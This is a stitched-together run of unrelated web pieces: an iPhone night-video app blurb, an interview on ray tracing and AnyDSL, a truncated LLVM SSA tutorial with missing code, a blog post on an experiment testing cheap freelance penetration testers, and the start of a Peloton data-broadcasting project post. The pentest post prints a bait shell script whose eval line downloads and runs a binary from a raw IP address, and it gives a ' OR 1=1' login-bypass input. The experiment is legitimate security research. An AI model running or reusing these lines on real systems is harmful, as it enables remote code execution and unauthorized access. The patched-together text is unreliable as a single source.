<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.

<p>(Interview of Prof. Dr. Philipp Slusallek, accomplished scientist and veteran from the computer graphics field, performed in January 2015 for Seekscale company, a cloud rendering startup)</p>



<p>Hardware acceleration is hot in rendering industry right now, and while people still try to figure out how to split workloads between CPUs and GPUs, FPGAs are quickly rising. We interviewed Philipp Slusallek, Scientific Director and Computer Graphics professor at Saarland University, and talked about what’s hot right now, and above all what we can expect in CG in the near future! We first heard about Philipp by coming across this great <a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html" target="_blank" rel="noreferrer noopener">discussion</a>.</p>



<p><strong>– What rendering techniques are best adapted to each hardware (GPU/CPU)?</strong></p>



<p>We basically have two key algorithms for rendering: rasterization and ray tracing. Rasterization is a “forward” rendering approach that renders the triangles in a scene one by one (conceptually) and each time updates all pixels covered by that triangle. Ray tracing, on the other hand, traces rays for each pixel to find out which triangle is visible for that pixel.</p>



<p>While the two seem very different, there are intermediate versions, such as “tile-based rasterization” or “frustum tracing”, where only the triangles covering a part of the screen are rasterized or all rays of a tile a traced together, respectively. If you make these tiles smaller, eventually a single pixel in size, rasterization starts to look much like ray tracing and vice versa as you trace larger and larger frusta. However, we still do not have algorithms that really cover the whole range of options well.</p>



<p>Additionally, we are seeing an increased need for advanced (programmable) shading and lighting effects (e.g. global illumination for smooth indirect illumination). While they are sitting on top of the core renderer, they impose many requirements that will determine what rendering approach can or cannot be used.</p>



<p>On the HW (hardware) side: GPUs started as HW dedicated for rasterization. But they have long evolved to become essentially large parallel compute engines (with some dedicated HW thrown in for rasterization, still). On the other hand, CPUs have become much better at parallel workloads with multi-core, multi-threading, and more and increasingly wide SIMD compute units (MMX, SSE, AVX, and the now upcoming AVX-512).</p>



<p>In some sense the two general HW designs are converging towards a similar sweet spot, but coming from two very different starting points.</p>



<p>Rasterization is more dependent on good HW support to be fast and so runs best on GPUs. Ray-tracing can be implemented with very good performance on each HW architecture, probably with some advantage for CPU-like architectures if you look at the latest comparison in the Embree paper at Siggraph 2014 (which may be a bit biased).</p>



<p><strong>– For a developer working on a renderer, what is the technical arbitrage between writing for a CPU, and for a GPU?</strong></p>



<p>Let me focus on writing a full ray tracing renderer using the raw HW. Writing a “renderer” that makes good use of OpenGL/DirectX is a very different story.</p>



<p>First of all writing a really good renderer is a big challenge — but also a lot of fun, independent of the choice of rendering algorithm or HW. It reaches across many levels from highly optimized inner loops all the way up to data management of often complex scenes. It thus touches many aspects of HW and SW and is a perfect poster child for how to best design efficient code for certain HW architectures.</p>



<p>An obvious key element is strongly optimizing the inner loops of a renderer as it determines the upper limit of the achievable rendering performance. This is where a lot of efforts and research has been, and still is, spent. Today, getting the best performance usually still means to hand-optimize the code (at the assembly or intrinsics level) for specific architectures and different choices of renderer configurations. While this often pays off, it requires expert knowledge, is very tedious, and often needs to be completely rewritten as the HW or the requirements change.</p>



<p>In addition, there are also many interdependencies between choices made at this low levels and the various levels of algorithms above it. This means that one needs to keep the code flexible in order for it to adapt to these requirements. However, with current technology, flexibility conflicts strongly with achieving optimal performance.</p>



<p>As a result of all this, almost all renderers have been targeting only one HW architecture: GPUs or CPUs and even within such an architecture, algorithms might have to be configured very differently on different instances. While cross-plattform renderers have been developed, e.g. in OpenCL, OpenCL is still a very low-level language that is not well suited for all HW architectures thus limiting what can be achieved.</p>



<p>In contrast, the hardware vendors each support renderer development with their HW-specific frameworks: Nvidia’s Optix is focused essentially only on GPUs, while Intel’s Embree targets CPU-like architectures (including their MIC/Xeon Phi processors). One interesting note is that both tools (and others) had to develop their own compiler technology to develop these frameworks. While both of these frameworks are very good choices they are black boxes that each come with their own set of drawbacks and limitations.</p>



<p>Already in 2008 we showed that with the right language/compiler tools high optimization of low-level code does not necessarily limit flexibility of the overall design. Our RTFact system [HPG 2008] used C++ template metaprogramming to specialize generic code from across several levels of abstraction at compile time. With this framework, we were able to easily configure very different renderers based on the same generic code and still achieve performance within about 10% of our previous hand-optimized code in each case — which was really remarkable. Unfortunately, writing the core code via C++ template metaprogramming is really hard and results in “write-only code” that is really hard to maintain. But it showed that performance and flexibility are NOT mutually exclusive!</p>



<p>Since then we have teamed up with one of the best compiler research group here at Saarland University (Prof. Sebastian Hack) and have jointly developed “AnyDSL”: It picks up the original idea of RTfact, generalizes it beyond just rendering, and uses much improved compiler technology to implement automatic specialization of generic code. AnyDSL provides a completely new programming models that offers developers a way for formulating hierarchies of conceptual abstractions while still allowing the compiler to eliminate any overhead usually associated with such abstractions (e.g. virtual function calls in C++).</p>



<p>This finally allows for writing completely generic code at each level of abstraction, specifying how that code should make use of abstractions at the lower levels. Finally, at the lowest level, code that has been coming from the different levels is combined and aggressively specialized using novel compiler algorithms to essentially interpret and partially execute any code that is knows at compile time. This is so effective because at these low level a lot of information that we abstracted from at the high levels is now available, such as information about the HW and the context in which some generic high-level code should be executed and which can be taken into account by the compiler. This approach combined the flexibility of hierarchical abstractions with the ability to generate optimized code that rival and often actually exceed the performance of hand-optimized code.</p>



<p>For example, our tests in image processing show that this approach often beats hand-optimized code because that code is very tedious and difficult to write such that not all promising optimization options are actually explored. Since simply use the generic code plus some rather simple mapping code for each specific HW, exploring the space of possible optimizations is much larger.</p>



<p>By now, we have already written a full ray tracer in AnyDSL that compiles and runs efficiently both on various different GPUs and CPUs. However, not all optimizations have been applied yet, so that we cannot really compare its performance yet. This will happen in the next few months but the partial results we have so far are already very promising.</p>



<p><strong>– Corona Render </strong><a href="http://home.seekscale.com/blog/corona-render-1.0-a-peek-into-interactive-rendering"><strong>uses</strong></a><strong> for example Intel Embree ray tracing library, for the CPU. What do you think of this solution?</strong></p>



<p>As I argue above, these tools are very useful. They provide hand-optimized kernels that solve some of the core problems, particular the inner loops and can thus be used as the basis for the higher layers, just as Corona did. However, they are essentially black boxes which makes it harder to adapt them to different purposes.</p>



<p>I believe that we need to go beyond these individual optimized kernels and create generic, adaptable, and reusable building blocks for rendering. That can be combined in flexible ways to create optimized renderers for many configurations and HW platforms. So far, we have been missing the right tools to even think how this could be done.</p>



<p>With AnyDSL we now have a tool that for the first time allows us to address this challenge. Now we are investigating how the to design such a flexible rendering framework: What are the right abstractions to be used at the different levels? How do we best map them to HW platforms? Which algorithms work best in what context and how do we need to formulate them, so they can easily be combined? How do we determine the data layout to optimize for different algorithms using it? And so on.</p>



<p>Essentially, AnyDSL allows us to rethink the design of renderers in a fundamentally new way.</p>

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>

  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>

        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to
communicate with its head unit tablet and built a device, the PeloMon, that takes that
data during a ride, without interfering with the Peloton software, to
broadcast it over Bluetooth <span>LE</span> to whatever devices you’d like — a watch, Zwift,
Wahoo, whatever. Stick around for logic analyzer traces, hardware diagrams,
cursing at Bluetooth, and some nice&nbsp;interfaces.</p>

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
